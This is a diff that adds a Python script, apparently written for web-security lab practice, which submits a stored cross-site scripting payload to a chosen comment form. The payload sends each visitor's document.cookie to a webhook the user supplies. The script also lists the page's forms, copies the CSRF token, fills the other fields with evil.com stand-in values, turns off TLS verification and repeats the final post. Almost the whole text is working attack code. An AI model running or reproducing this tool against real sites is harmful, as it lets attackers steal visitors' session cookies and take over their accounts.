@@ -314,3 +314,87 @@ print(f"[+] status: {res.status_code}")
 # # ========== پایان ==========
 # # اگه نمی‌خوای مرورگر بسته شه، این خط رو کامنت کن
 # # driver.quit()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import requests
+from bs4 import BeautifulSoup
+import urllib3
+from urllib.parse import urljoin
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+url = input("enter your target post URL: ").strip()
+webhook = input("enter your webhook URL: ").strip()
+
+# Payload XSS
+payload = f'<script>new Image().src="{webhook}?c="+document.cookie;</script>'
+
+session = requests.Session()
+res = session.get(url, verify=False)
+soup = BeautifulSoup(res.text, "html.parser")
+
+forms = soup.find_all("form")
+print(f"[+] Found {len(forms)} form(s)")
+
+for i, form in enumerate(forms):
+    print(f"\nForm #{i+1}")
+    print(" Action:", form.get("action"))
+    print(" Method:", form.get("method"))
+    for input_tag in form.find_all(["input", "textarea"]):
+        print(f"  {input_tag.name}: type={input_tag.get('type','text')}, name={input_tag.get('name')}")
+
+choice = int(input(f"\nChoose form to submit (1-{len(forms)}): ")) - 1
+form = forms[choice]
+
+action = form.get("action")
+method = form.get("method", "get").lower()
+submit_url = action if action.startswith("http") else urljoin(url, action)
+
+# Prepare payload data
+data = {}
+for input_tag in form.find_all(["input", "textarea"]):
+    name = input_tag.get("name")
+    if not name:
+        continue
+    if name == "email":
+        data[name] = "attacker@evil.com"
+    elif name == "postId":
+        data[name] = url.split("postId=")[-1]
+    elif name == "csrf":
+        data[name] = input_tag.get("value", "")
+        print("[*] CSRF token:", data[name])
+    elif input_tag.name == "textarea":
+        data[name] = payload
+    elif name == "website":
+        data[name] = "https://evil.com"
+    else:
+        data[name] = "attacker"
+
+print(f"\n[+] Sending payload to {submit_url} ...")
+res = session.post(submit_url, data=data, verify=False)
+print("[+] Status code:", res.status_code)
+
+if res.status_code == 200:
+    print("[✓] Payload sent successfully. Check webhook!")
+elif res.status_code == 400:
+    print("[-] Bad request (400). Check for missing or invalid form fields.")
+else:
+    print("[-] Something else went wrong.")
+
+
+
+print(f"[+] sending paylaod {submit_url}")
+res = session.post(submit_url, data=data, verify=False)
+print(f"[+] status: {res.status_code}")
